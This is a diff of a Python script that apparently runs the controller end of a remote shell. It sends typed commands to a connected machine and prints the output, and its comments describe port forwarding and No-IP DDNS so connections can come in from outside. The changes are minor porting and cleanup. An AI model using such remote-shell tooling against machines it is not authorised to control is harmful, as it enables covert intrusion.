@@ -1,3 +1,4 @@
+#!/usr/bin/python3.5
 #You should configure PORT forwarding and NO-IP DDNS together#
 
 from __future__ import print_function
@@ -5,14 +6,14 @@ import socket
 import sys
 
 import os
-os.system("sudo /etc/init.d/dns-clean")
+#os.system("sudo /etc/init.d/dns-clean")
 
 # **** !!! Achtung !!!****
 # Most probably your router doesn't like connections to the external ip
-# from an inside ip. So you'll need a computer which is really outside 
-# of your home network to test it. This is quite a normal behaviour 
+# from an inside ip. So you'll need a computer which is really outside
+# of your home network to test it. This is quite a normal behaviour
 # for soho routers.
-# Sometimes, some routers don't allow to connect using the external 
+# Sometimes, some routers don't allow to connect using the external
 # address from inside the LAN.
 # ************************
 
@@ -35,7 +36,7 @@ while True:
 	client.send(cmd.encode())
 	terminal=client.recv(1024);
 	print(terminal, end='')
-	cmd=raw_input() #cmd = sys.stdin.read() then type CTRL+d to send
+	cmd=input() #cmd = sys.stdin.read() then type CTRL+d to send
 	if cmd == "exit()":
 		break
 	cmd = cmd + "\n"
@@ -50,5 +51,3 @@ while True:
 	print(file_buffer,end='')
 
 client.close()
-
-
